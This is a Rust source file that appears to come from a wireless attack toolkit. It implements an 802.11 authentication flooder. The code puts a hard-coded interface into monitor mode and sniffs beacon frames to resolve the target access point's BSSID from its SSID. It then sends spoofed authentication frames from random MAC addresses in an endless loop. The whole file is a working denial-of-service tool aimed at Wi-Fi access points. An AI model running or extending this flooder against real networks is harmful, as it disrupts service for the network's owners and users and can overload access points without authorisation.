use std::{thread, time::Duration};
use crate::arg_parser::{AuthArgs, parse_mac};
use crate::dissectors::BeaconDissector;
use crate::generators::RandValues;
use crate::iface::InterfaceManager;
use crate::pkt_builder::PacketBuilder;
use crate::sniffer::PacketSniffer;
use crate::sockets::Layer2RawSocket;
use crate::utils::{abort, inline_display};



pub struct AuthenticationFlooder {
    args:  AuthArgs,
    iface: String,
}


impl AuthenticationFlooder {

    pub fn new(args: AuthArgs) -> Self {
        Self {
            args,
            iface: "wlp2s0".to_string(),
        }
    }



    pub fn execute(&mut self) {
        InterfaceManager::enable_monitor_mode(&self.iface);
        
        let bssid = self.args.bssid.unwrap_or_else(|| self.resolve_bssid());
        self.send_endlessly(bssid);
        
        InterfaceManager::disable_monitor_mode(&self.iface);
    }



    fn resolve_bssid(&mut self) -> [u8; 6] {
        let beacons = self.get_beacons();
        self.process_beacons(beacons)
    }



    fn get_beacons(&mut self) -> Vec<Vec<u8>> {
        InterfaceManager::enable_monitor_mode(&self.iface);
        
        let mut sniffer = PacketSniffer::new(
            self.iface.clone(), "type mgt and subtype beacon".to_string()
        );
        
        sniffer.start();
        thread::sleep(Duration::from_secs(2));
        sniffer.stop();

        sniffer.get_packets()
    }



    fn process_beacons(&self, beacons: Vec<Vec<u8>>) -> [u8; 6] {
        for b in beacons {
            if let Some(info) = BeaconDissector::parse_beacon(&b) {
                if info[0] == self.args.ssid {
                    return parse_mac(&info[1]).unwrap();
                }
            }
        }
        
        InterfaceManager::disable_monitor_mode(&self.iface);
        abort("It was not possible to resolve BSSID. Try again or set a BSSID")
    }



    fn send_endlessly(&self, bssid: [u8; 6]) {
        let mut rand    = RandValues::new();
        let mut builder = PacketBuilder::new();
        let socket      = Layer2RawSocket::new(&self.iface);
        
        let mut sent: usize = 0;
        loop {
            let pkt = builder.auth_802_11(rand.get_random_mac(), bssid);
            socket.send(pkt);
            sent += 1;
            Self::display_progress(sent);
        }
    }


    fn display_progress(sent: usize) {
        let msg: String = format!("Packets sent: {}", &sent);
        inline_display(msg);
    }

}
